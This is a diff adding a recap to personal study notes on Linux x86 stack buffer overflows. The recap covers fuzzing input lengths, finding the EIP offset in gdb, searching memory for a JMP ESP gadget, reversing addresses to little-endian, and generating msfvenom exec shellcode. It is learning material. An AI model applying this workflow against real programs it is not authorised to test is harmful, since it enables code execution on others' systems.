@@ -171,6 +171,57 @@ Buffer Overflow Common Terms: HEAP - Memory that can be allocated and deallocate
 msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
 msfvenom -p linux/x86/exec CMD="whoami && ifconfig" -b '\x00' -f python
 
+Recap:
+Figure Out what normal looks like, interact with the program
+
+./func <<<$(python mycode.py)    #User Input
+./fun $(python mycode.py)        #CLI Argument
+
+Overflow the Program with random char lengths --> 200, 500, 800
+
+gdb ./program        #CMDs --> run
+                               run <<<$(python script.py)
+                               run $(python script.py)
+                               info functions
+                               pdisass functions
+                               pdisass main (main shows additional functions)
+                               pdisass randomfunc (show even more functions)
+                               quit 
+
+Wiremask.eu (Random string generator)
+200 key length -> paste in script
+run it again to find byte offset
+
+run <<<$(python ./buff.py)
+
+take whats in the EIP, pasted back into wiremask.eu
+
+FIND JMP ESP:
+env - gdb ./func
+show env
+show env COLUMNS
+unset env LINES
+info proc map 
+find /b (Address after HEAP), (Address END of STACK), 0xff, 0xE4
+
+Little endian to Big endian (reverse it)     0xf7de3b59 -> "\x59\x3b\xde\xf7"
+
+place in script!
+
+OR
+
+GENERATE SHELLCODE
+msfvenom -p linux/x86/exec CMD="<cmd>" -b '\x00' -f python  #Generates shellcode to put into mybuff.py
+                                                            #MAY FAIL, Regenerate
+
+
+
+
+
+
+
+
+
 
 
 
